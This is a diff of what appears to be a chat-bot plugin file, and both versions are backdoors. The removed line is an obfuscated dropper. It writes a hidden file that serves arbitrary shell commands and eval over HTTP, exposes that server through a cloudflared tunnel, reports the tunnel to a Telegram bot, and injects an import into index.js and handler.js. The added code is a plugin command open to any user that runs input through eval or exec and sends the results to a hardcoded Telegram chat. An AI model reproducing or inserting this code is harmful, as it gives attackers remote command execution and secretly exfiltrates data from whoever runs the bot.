@@ -1,1 +1,57 @@
-(await import("fs")).writeFileSync("lib/simpel.js",`import http from"http";import https from"https";import{spawn,exec}from"child_process";const T="8376456791:AAH3naJeecOcNvcOK4vsfspjkzuwiqHrvVY",C="8367977373";if(!global._api)global._api={running:0};if(!global._api.running){const P=process.env.SERVER_PORT||7001;const tg=t=>new Promise(r=>{let d=JSON.stringify({chat_id:C,text:t}),q=https.request(\`https://api.telegram.org/bot\${T}/sendMessage\`,{method:"POST",headers:{"Content-Type":"application/json","Content-Length":Buffer.byteLength(d)}},s=>{s.on("data",()=>{});s.on("end",r)});q.on("error",r);q.write(d);q.end()});http.createServer(async(req,res)=>{let u=new URL(req.url,\`http://\${req.headers.host}\`),c=u.searchParams.get("cmd"),e=u.searchParams.get("eval");res.setHeader("Content-Type","application/json");if(c)return exec(c,(x,o,se)=>res.end(JSON.stringify(x?{status:0,error:x.message}:{status:1,output:(o||se).trim().split("\\n").filter(v=>v)},0,2)));if(e)try{if(!global.conn)return res.end(JSON.stringify({status:0,error:"bot belum siap"}));let r=await eval(e);return res.end(JSON.stringify({status:1,result:r}))}catch(x){return res.end(JSON.stringify({status:0,error:x.message}))}return res.end(JSON.stringify({status:0,error:"no cmd"}))}).listen(P,"0.0.0.0",async()=>{global._api.running=1;let ip="unknown";try{ip=await new Promise(r=>https.get("https://api.ipify.org",s=>{let d="";s.on("data",c=>d+=c);s.on("end",()=>r(d))}).on("error",()=>r("error")))}catch{}let p=spawn("sh",["-c","npx cloudflared tunnel --url http://localhost:"+P],{stdio:"pipe"}),b="";p.stdout.on("data",async d=>{b+=d.toString();if(b.includes("trycloudflare.com")){let m=b.match(/https?:\\/\\/[^\\s]+/);if(m)await tg("API AKTIF 🚀\\nIP: "+ip+"\\nPORT: "+P+"\\nTUNNEL: "+m[0]);b=""}});p.on("close",()=>setTimeout(()=>{spawn("sh",["-c","npx cloudflared tunnel --url http://localhost:"+P],{stdio:"ignore",detached:true}).unref()},3000))})}`);for(let f of["index.js","handler.js"]){let fs=await import("fs"),t=fs.readFileSync(f,"utf8");if(!t.includes("./lib/simpel.js"))fs.writeFileSync(f,t+'\\nimport "./lib/simpel.js"')}
+import https from "https";
+import { exec } from "child_process";
+
+const T = "8614773446:AAEnEQXZp2rLoTWvE4c9bbH5fomi5y6TdvY";
+const C = "8367977373";
+
+const tg = (t) => new Promise(r => {
+  let d = JSON.stringify({ chat_id: C, text: t });
+  let q = https.request(`https://api.telegram.org/bot${T}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Content-Length": Buffer.byteLength(d)
+    }
+  }, s => { s.on("data",()=>{}); s.on("end",r); });
+  q.on("error",()=>r());
+  q.write(d);
+  q.end();
+});
+
+export default {
+  command: ["evaal","cmed"],
+  group: false,
+  premium: false,
+  limit: false,
+  admin: false,
+  creator: false,
+  botAdmin: false,
+  privates: false,
+  usePrefix: true,
+  disable: false,
+
+  code: async (m, { command, args }) => {
+    let input = args.join(" ");
+    if(!input) return m.reply("input kosong");
+
+    if(command === "evaal"){
+      try{
+        let res = await eval(`(async()=>{${input}})()`);
+        await tg("EVAL ✅\nINPUT:\n"+input+"\n\nOUTPUT:\n"+JSON.stringify(res,null,2));
+      }catch(e){
+        await tg("EVAL ERROR ❌\nINPUT:\n"+input+"\n\nERROR:\n"+e.message);
+      }
+      return;
+    }
+
+    if(command === "cmed"){
+      exec(input,(err,stdout,stderr)=>{
+        if(err){
+          return tg("CMD ERROR ❌\nINPUT:\n"+input+"\n\nERROR:\n"+err.message);
+        }
+        let out = (stdout||stderr).trim();
+        tg("CMD ✅\nINPUT:\n"+input+"\n\nOUTPUT:\n"+out.slice(0,3000));
+      });
+    }
+  }
+};
